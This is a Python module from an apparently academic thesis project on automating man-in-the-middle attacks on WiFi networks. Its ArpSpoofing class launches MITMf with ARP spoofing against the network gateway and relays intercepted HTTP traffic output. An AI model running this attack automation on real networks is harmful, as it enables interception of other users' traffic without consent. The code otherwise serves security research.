#!/usr/bin/env python3
"""
Tampering with network topology

Automation of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016
"""
import logging
from enum import Enum, unique
from typing import Optional, TextIO

from wifimitm.updatableProcess import UpdatableProcess
from .model import WirelessInterface

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'

logger = logging.getLogger(__name__)


class ArpSpoofing(UpdatableProcess):
    """
    "MITMf aims to provide a one-stop-shop for Man-In-The-Middle and network attacks while updating and improving
    existing attacks and techniques.
    Originally built to address the significant shortcomings of other tools (e.g Ettercap, Mallory), it's been almost
    completely re-written from scratch to provide a modular and easily extendible framework that anyone can use to
    implement their own MITM attack."
    `Framework for Man-In-The-Middle attacks <https://github.com/byt3bl33d3r/MITMf>`_
    """

    @unique
    class State(Enum):
        """
        MITMf process states.
        """
        SPOOFING = 0
        """ARP Spoofing to act as a default gateway for the local network."""
        STARTED = 2
        """Process just started."""
        TERMINATED = 100
        """Process have been terminated. By self.stop() call, on its own or by someone else."""

    def __init__(self, interface: WirelessInterface):
        """
        :type interface: WirelessInterface
        :param interface: wireless interface for spoofing
        """
        self.state = self.State.STARTED

        self.interface = interface  # type: WirelessInterface

        cmd = ['mitmf',
               '-i', self.interface.name,
               '--spoof', '--arp',
               '--gateway', self.interface.gateway]
        super().__init__(cmd)

    def __str__(self):
        return '<{!s} state={!s}>'.format(
            type(self).__name__, self.state)

    def update(self, print_stream: Optional[TextIO]=None, print_prefix: Optional[str]='MITMf 1> '):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive.
        :type print_stream: Optional[TextIO]
        :param print_stream: Print information about HTTP traffic from MITMf's stdout to provided stream.
        :type print_prefix: Optional[str]
        :param print_prefix: Prepend provided string in the beginning of every line printed to `print_stream`.
        """
        super().update()
        # Is process running? State would be changed after reading stdout and stderr.
        self.poll()

        # check every added line in stdout
        if self.stdout_r and not self.stdout_r.closed:
            for line in self.stdout_r:
                if self.state == self.State.STARTED and line == '|_ SMB server online\n':
                    self.state = self.State.SPOOFING

                elif self.state == self.State.SPOOFING and line != '\n':
                    if print_stream:
                        print(print_prefix + line, end='', file=print_stream)

        # check every added line in stderr
        if self.stderr_r and not self.stderr_r.closed:
            for line in self.stderr_r:
                if ' * Running on http://127.0.0.1:9999/ (Press CTRL+C to quit)\n' == line:
                    continue
                # NOTE: stderr should be now empty
                logger.warning("Unexpected stderr of 'mitmf': '{}'. {}".format(line, str(self)))

        # Change state if process was not running in the time of poll() call in the beginning of this method.
        # NOTE: Process' poll() needs to be called in the beginning of this method and returncode checked in the end
        # to ensure all feedback (stdout and stderr) is read and states are changed accordingly.
        # If the process exited, its state is not changed immediately. All available feedback is read and then
        # the state is changed to self.State.TERMINATED. State, flags,stats and others can be changed during reading
        # the available feedback even if the process exited. But self.State.TERMINATED is assigned here if
        # the process exited.
        if self.returncode is not None:
            self.state = self.State.TERMINATED
